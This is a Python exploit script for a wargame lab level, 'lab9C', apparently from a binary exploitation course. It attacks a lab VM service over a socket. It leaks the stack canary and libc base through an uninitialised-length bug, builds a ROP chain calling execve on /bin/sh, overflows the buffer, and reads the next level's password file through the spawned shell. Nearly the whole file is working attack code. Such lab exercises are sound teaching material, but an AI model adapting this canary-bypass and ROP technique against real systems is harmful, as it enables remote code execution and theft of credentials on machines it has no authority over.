#!/usr/bin/python
# coding: utf-8

'''
RCE Exploit for level lab9C
'''

import socket
import time

#   Exploitation: There is a bug in the constructor, when setting the value of
# alloc_len, the value of len hasn't been initialized yet. This means that if
# a value sufficiently large is in that stack position at the moment of setting
# alloc_len, we can overflow the vector_data buffer and smash the stack.

##################
#  Global stuff  #
##################

PORT = 9943
# ****** IMPORTANT ******
# These values depend either on your VM configuration or the way your binary
# was compiled, please check that they are the same as yours before executing
# this exploit.
HOST = '10.0.0.2'  # VM IP address
libcbase_from_ret = 0x19a83  # main()'s return address offset from libc base
execveoff = 0xb5be0
binshoff = 0x160a24
# You can get these values using python (inside the VM):
# >>> import pwn
# >>> libc = pwn.ELF('/lib/i386-linux-gnu/libc.so.6')
# >>> binshoff = next(libc.search('/bin/sh\x00'))
# >>> execveoff = libc.symbols['execve']
# ***********************

###############
#  Functions  #
###############


def sendrecv(s, buf, rec=True):
    '''
    Sends raw data to the remote process and returns it's output.
    '''
    s.sendall(buf)
    time.sleep(0.02)
    if rec:
        return s.recv(2048)
    return None


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print '[+] Connecting with remote host @ %s:%d' % (HOST, PORT)
        s.connect((HOST, PORT))
        print '[+] Connection accepted!'

        print '\n[+] Stage 1: Steal stack canary and leak libc base'
        sendrecv(s, '2\n')
        canary = int(sendrecv(s, '257\n').split('\n')[0].split()[-1])
        sendrecv(s, '2\n')
        retaddr = int(sendrecv(s, '261\n').split('\n')[0].split()[-1])
        # Convert the addresses
        canary = 0x100000000 + canary if canary < 0 else canary
        retaddr = 0x100000000 + retaddr if retaddr < 0 else retaddr
        libcbase = retaddr - libcbase_from_ret
        print '[+] Canary stolen (0x%08x)' % canary
        print '[+] Libc base leaked (0x%08x)' % libcbase

        print '\n[+] Stage 2: Get offsets'
        execve = libcbase + execveoff
        binsh = libcbase + binshoff
        print '[+] execve @ 0x%08x' % execve
        print '[+] /bin/sh @ 0x%08x' % binsh

        print '\n[+] Stage 3: Build ROP chain and bypass SSP'
        # Start with the canary to bypass SSP
        rop = [canary]
        # Some 1337 padding
        rop.extend([322376503]*3)
        # execve with its arguments
        rop.extend([execve, 322376503, binsh, 0, 0])
        print '[+] ROP chain built! Smashing the stack...'
        for i in xrange(256):
            sendrecv(s, '1\n')
            sendrecv(s, '322376503\n')
        for x in rop:
            sendrecv(s, '1\n')
            sendrecv(s, '%d\n' % x)
        print '[+] ROP chain ready! Time to invoke it'
        sendrecv(s, '3\n', False)

        print '\n[+] Final stage: Read flag and go home'
        flag = sendrecv(s, 'cat /home/lab9A/.pass\n')
        print '[+] Flag: %s' % flag,
        # Uncomment this to keep the shell
        # while True:
        #    print sendrecv(s, raw_input('$ ')+'\n'),
    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, aborting...'
    except RuntimeError as e:
        print '[!] Error: %s' % e
    except socket.error as e:
        print '[!] Communication error: %s' % e
    finally:
        s.close()
